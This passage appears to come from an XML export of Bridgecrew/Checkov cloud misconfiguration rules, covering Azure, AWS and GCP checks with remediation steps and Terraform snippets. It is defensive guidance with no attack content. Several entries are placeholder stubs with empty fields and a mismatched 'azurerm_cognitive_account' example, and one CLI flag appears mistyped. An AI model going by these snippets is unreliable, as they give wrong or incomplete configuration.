      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repositories-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_152</key>
    <name>Ensure Azure Client Certificates are enforced for API management</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-client-certificates-are-not-enforced-for-api-management"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-client-certificates-are-not-enforced-for-api-management"></div>Azure Client Certificates are not enforced for API management</div><a aria-label="Skip link to Azure Client Certificates are not enforced for API management" class="heading-anchor-icon fa fa-anchor" href="#azure-client-certificates-are-not-enforced-for-api-management"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-client-certificates-are-enforced-for-api-management' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-client-certificates-are-enforced-for-api-management</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-client-certificates-are-enforced-for-api-management' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_156</key>
    <name>Ensure Azure PostgreSQL Database Server has log retention enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-database-server-does-not-have-log-retention-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-database-server-does-not-have-log-retention-enabled"></div>Azure PostgreSQL Database Server does not have log retention enabled</div><a aria-label="Skip link to Azure PostgreSQL Database Server does not have log retention enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-database-server-does-not-have-log-retention-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="runtime---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-runtime-buildtime"></div>Runtime - Buildtime </div><a aria-label="Skip link to Runtime - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#runtime---buildtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-database-server-has-log-retention-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-postgresql-database-server-has-log-retention-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-database-server-has-log-retention-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_216</key>
    <name>Ensure AWS Cloudfront distribution is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudfront-distribution-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloudfront-distribution-is-disabled"></div>AWS Cloudfront distribution is disabled</div><a aria-label="Skip link to AWS Cloudfront distribution is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudfront-distribution-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-distribution-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-distribution-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-distribution-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_78</key>
    <name>Ensure GCP Cloud storage has versioning enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-cloud-storage-does-not-have-versioning-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-cloud-storage-does-not-have-versioning-enabled"></div>GCP Cloud storage does not have versioning enabled</div><a aria-label="Skip link to GCP Cloud storage does not have versioning enabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-cloud-storage-does-not-have-versioning-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-storage-has-versioning-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-cloud-storage-has-versioning-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-cloud-storage-has-versioning-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_17</key>
    <name>Ensure RSASHA1 is not used for Zone-Signing and Key-Signing Keys in Cloud DNS DNSSEC</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rsasha1-is-used-for-zone-signing-and-key-signing-keys-in-cloud-dns-dnssec"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rsasha-1-is-used-for-zone-signing-and-key-signing-keys-in-cloud-dns-dnssec"></div>RSASHA1 is used for Zone-Signing and Key-Signing Keys in Cloud DNS DNSSEC</div><a aria-label="Skip link to RSASHA1 is used for Zone-Signing and Key-Signing Keys in Cloud DNS DNSSEC" class="heading-anchor-icon fa fa-anchor" href="#rsasha1-is-used-for-zone-signing-and-key-signing-keys-in-cloud-dns-dnssec"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>DNSSEC is a feature of the Domain Name System (DNS) that authenticates responses to domain name lookups. There are several advanced DNSSEC configuration options you can use if DNSSEC is enabled for your managed zones. These include: unique signing algorithms, denial of existence and the ability to use record types that require or recommend DNSSEC for their use.</p>
<p>When enabling DNSSEC for a managed zone, or creating a managed zone with DNSSEC, you can select the DNSSEC signing algorithms and the denial-of-existence type. We do not recommend you use RSASHA1 unless you need it for compatibility reasons; there is no security advantage to using it with larger key lengths.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terrraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terrraform"></div>Terrraform</div><a aria-label="Skip link to Terrraform" class="heading-anchor-icon fa fa-anchor" href="#terrraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_dns_managed_zone</li>
<li><strong>Arguments</strong>:<br/>
<strong>zone_signing_keys</strong> - A list of Zone-signing key (ZSK) records. Structure is documented below.<br/>
<strong>key_signing_keys</strong> - A list of Key-signing key (KSK) records. Structure is documented below. </li>
</ul>
<p>Additionally, the DS record is provided:<br/>
The <strong>key_signing_keys</strong> and <strong>zone_signing_keys</strong> block supports:<br/>
algorithm - String mnemonic specifying the DNSSEC algorithm of this key. Immutable after creation time. Possible values are ecdsap256sha256, ecdsap384sha384, rsasha1, rsasha256, and rsasha512.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_dns_managed_zone" "foo" {
  name     = "foobar"
  dns_name = "foo.bar."

  zone_signing_keys {
-   algorithm = "rsasha1"
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_6' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_27</key>
    <name>Ensure default network does not exist in a project</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-network-exists-in-a-project"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-network-exists-in-a-project"></div>Default network exists in a project</div><a aria-label="Skip link to Default network exists in a project" class="heading-anchor-icon fa fa-anchor" href="#default-network-exists-in-a-project"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The default network has a pre-configured network configuration and automatically generates the following insecure firewall rules:</p>
<ul>
<li><strong>default-allow-internal</strong>: Allows ingress connections for all protocols and ports among instances in the network.</li>
<li><strong>default-allow-ssh</strong>: Allows ingress connections on TCP port 22(SSH) from any source to any instance in the network.</li>
<li><strong>default-allow-rdp</strong>: Allows ingress connections on TCP port 3389(RDP) from any source to any instance in the network.</li>
<li><strong>default-allow-icmp</strong>: Allows ingress ICMP traffic from any source to any instance in<br/>
the network.</li>
</ul>
<p>These automatically created firewall rules do not get audit logged and cannot be configured to enable firewall rule logging. In addition, the default network is an auto mode network, which means that its subnets use the same predefined range of IP addresses. As a result, it is not possible to use Cloud VPN or VPC Network Peering with the default network.</p>
<p>We recommend that a project should not have a default network to prevent use of default network. Based on organization security and networking requirements, the organization should create a new network and delete the default network.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/networking/networks/list" target="_self">VPC networks</a>.</li>
<li>Click the network named <strong>default</strong>.</li>
<li>On the network detail page, click <strong>EDIT</strong>.</li>
<li>Click <strong>DELETE VPC NETWORK</strong>.</li>
<li>If needed, create a new network to replace the default network.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>For each Google Cloud Platform project:</p>
<ol>
<li>Delete the default network:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute networks delete default</code></li>
<li>If needed, create a new network to replace it:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute networks create &lt;network name&gt;</code></li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_project</li>
<li><strong>Argument</strong>: auto_create_network</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_project" "my_project" {
  name       = "My Project"
  project_id = "your-project-id"
  org_id     = "1234567"
+ auto_create_network   = false
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_7' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_264</key>
    <name>Ensure AWS App Flow connector profile uses Customer Managed Keys (CMKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-app-flow-connector-profile-does-not-use-customer-managed-keys-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-app-flow-connector-profile-does-not-use-customer-managed-keys-cm-ks"></div>AWS App Flow connector profile does not use Customer Managed Keys (CMKs)</div><a aria-label="Skip link to AWS App Flow connector profile does not use Customer Managed Keys (CMKs)" class="heading-anchor-icon fa fa-anchor" href="#aws-app-flow-connector-profile-does-not-use-customer-managed-keys-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies App Flow connector profile which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your App Flow connector profile data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_appflow_connector_profile" "pass" {
  name            = "example_profile"
  connector_type  = "Redshift"
  connection_mode = "Public"
  kms_arn = aws_kms_key.example.arn


  connector_profile_config {

    connector_profile_credentials {
      redshift {
        password = aws_redshift_cluster.example.master_password
        username = aws_redshift_cluster.example.master_username
      }
    }

    connector_profile_properties {
      redshift {
        bucket_name  = aws_s3_bucket.example.name
        database_url = "jdbc:redshift://${aws_redshift_cluster.example.endpoint}/${aws_redshift_cluster.example.database_name}"
        role_arn     = aws_iam_role.example.arn
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-app-flow-connector-profile-uses-customer-managed-keys-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-app-flow-connector-profile-uses-customer-managed-keys-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-app-flow-connector-profile-uses-customer-managed-keys-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_151</key>
    <name>Ensure Azure Windows VM enables encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-windows-vm-does-not-enable-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-windows-vm-does-not-enable-encryption"></div>Azure Windows VM does not enable encryption</div><a aria-label="Skip link to Azure Windows VM does not enable encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-windows-vm-does-not-enable-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-windows-vm-enables-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-windows-vm-enables-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-windows-vm-enables-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_194</key>
    <name>Ensure AWS AppSync has field-level logs enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-appsync-has-field-level-logs-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-app-sync-has-field-level-logs-disabled"></div>AWS AppSync has field-level logs disabled</div><a aria-label="Skip link to AWS AppSync has field-level logs disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-appsync-has-field-level-logs-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_32</key>
    <name>Ensure GCP VM instances have block project-wide SSH keys feature enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-vm-instances-have-block-project-wide-ssh-keys-feature-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-vm-instances-have-block-project-wide-ssh-keys-feature-disabled"></div>GCP VM instances have block project-wide SSH keys feature disabled</div><a aria-label="Skip link to GCP VM instances have block project-wide SSH keys feature disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-vm-instances-have-block-project-wide-ssh-keys-feature-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Project-wide SSH keys are stored in Compute/Project-meta-data. Project wide SSH keys can be used to login into all instances within a project. Using project-wide SSH keys eases SSH key management. If SSH keys are compromised, the potential security risk can impact all instances within a project. </p>
<p>We recommend you use Instance specific SSH keys instead of common/shared project-wide SSH key(s), to limit the attack surface should the SSH keys be compromised.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/instances" target="_self">VM instances</a>.</li>
<li>List all the instances in your project.</li>
<li>Click the name of the Impacted instance.</li>
<li>Click <strong>Edit</strong> in the toolbar.</li>
<li>Under <strong>SSH Keys</strong>, navigate to <strong>Block project-wide SSH keys </strong>.</li>
<li>To block users with project-wide SSH keys from connecting to this instance, select <strong>Block project-wide SSH keys</strong>.</li>
<li>At the bottom of the page, click <strong>Save</strong>.</li>
</ol>
<p>Repeat these steps for each impacted Instance.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To block project-wide public SSH keys, set the metadata value to TRUE using the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances add-metadata INSTANCE_NAME 
--metadata block-projectssh-keys=TRUE
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_instance</li>
